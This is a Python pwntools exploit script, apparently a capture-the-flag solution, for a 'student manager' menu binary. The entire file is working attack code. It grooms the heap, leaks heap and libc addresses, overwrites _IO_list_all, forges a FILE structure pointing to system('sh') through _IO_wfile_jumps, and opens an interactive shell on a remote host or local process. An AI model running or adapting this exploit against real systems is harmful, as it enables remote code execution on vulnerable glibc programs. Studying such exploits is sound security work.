from argparse import ArgumentParser
import os
from pwn import *


DEFAULT_HOST = "192.0.100.2"
DEFAULT_PORT = 9999
DEFAULT_LIBC = "./libc.so.6"
DEFAULT_BINARY = "./pwn"


class StudentClient:
    def __init__(self, tube):
        self.io = tube

    def menu(self, value):
        self.io.sendlineafter(b"> ", str(value).encode())

    def register(self, sid, name=b"a", password=b"a"):
        self.menu(1)
        self.io.sendlineafter(b"ID: ", str(sid).encode())
        self.io.sendlineafter(b"Name: ", name)
        self.io.sendlineafter(b"Pass: ", password)

    def login(self, sid, password=b"a"):
        self.menu(2)
        self.io.sendlineafter(b"ID: ", str(sid).encode())
        self.io.sendlineafter(b"Pass: ", password)

    def delete(self, sid):
        self.menu(3)
        self.io.sendlineafter(b"ID to delete: ", str(sid).encode())

    def edit_bio(self, size, payload):
        self.menu(2)
        self.io.sendline(str(size).encode())
        self.io.send(payload)

    def view(self):
        self.menu(1)

    def logout(self):
        self.menu(0)


def leak_qword_after_bio(io):
    io.recvuntil(b"Bio: ")
    return u64(io.recv(6).ljust(8, b"\x00"))


def exploit(client, libc):
    c = client

    for sid in range(1, 5):
        c.register(sid)

    c.login(3)
    c.edit_bio(0x10, b"a")
    c.logout()

    for sid in range(100, 107):
        c.register(sid)

    c.login(1)
    c.edit_bio(0x80, b"a")
    c.logout()

    c.register(5)
    for sid in range(100, 106):
        c.delete(sid)
    for sid in (2, 1, 5, 106):
        c.delete(sid)

    for sid in range(200, 208):
        c.register(sid)

    for sid in (200, 3):
        c.login(sid)
        c.edit_bio(0x10, b"a")
        c.logout()

    c.register(514)
    for sid in range(300, 305):
        c.register(sid)

    for sid in range(200, 208):
        c.delete(sid)

    c.login(514)
    c.view()
    heap_base = leak_qword_after_bio(c.io) - 0xBD0
    log.info("heap_base = %#x", heap_base)
    c.logout()

    for sid in range(200, 208):
        c.register(sid)

    fake_libc_ptr = heap_base + 0x8F0
    c.login(200)
    c.edit_bio(0x88, p64(fake_libc_ptr) * 0x11)
    c.logout()
    c.logout()

    c.delete(200)
    c.register(400)
    c.register(401)

    c.login(401)
    c.view()
    libc.address = leak_qword_after_bio(c.io) - 0x203B20
    log.info("libc_base = %#x", libc.address)
    c.logout()

    c.register(403)
    c.login(403)
    io_list_all = libc.sym["_IO_list_all"]
    wfile_jumps = libc.sym["_IO_wfile_jumps"]
    c.edit_bio(0x80, p64(io_list_all) * 0x10)
    c.logout()
    c.logout()

    c.register(404)
    c.login(404)
    fake_file = heap_base + 0xE20
    fake_chunk = flat(
        {
            0x00: b"  sh",
            0x28: p64(1),
            0x68: p64(libc.sym["system"]),
            0x88: p64(heap_base + 0x1200),
            0xA0: p64(fake_file),
            0xD8: p64(wfile_jumps),
            0xE0: p64(fake_file),
        },
        filler=b"\x00",
    )
    c.edit_bio(0x200, fake_chunk)
    c.logout()

    c.delete(403)
    c.register(405)
    c.register(406)
    c.login(406)
    c.edit_bio(0x10, p64(fake_file))
    c.logout()

    log.info("_IO_list_all = %#x", io_list_all)
    c.menu(0)
    c.io.interactive()


def build_tube(args):
    if args.local:
        if args.ld:
            libpath = args.libpath or os.path.dirname(os.path.abspath(args.libc)) or "."
            return process([args.ld, "--library-path", libpath, args.binary])
        return process(args.binary)
    return remote(args.host, args.port)


def parse_args():
    parser = ArgumentParser(description="Student manager FSOP exploit refactor")
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", default=DEFAULT_PORT, type=int)
    parser.add_argument("--libc", default=DEFAULT_LIBC)
    parser.add_argument("--binary", default=DEFAULT_BINARY)
    parser.add_argument("--ld", default="./ld-linux-x86-64.so.2")
    parser.add_argument("--libpath", default=None)
    parser.add_argument("--local", action="store_true")
    parser.add_argument("--debug", action="store_true")
    return parser.parse_args()


def main():
    args = parse_args()
    context.log_level = "debug" if args.debug else "info"
    libc = ELF(args.libc)
    tube = build_tube(args)
    exploit(StudentClient(tube), libc)


if __name__ == "__main__":
    main()
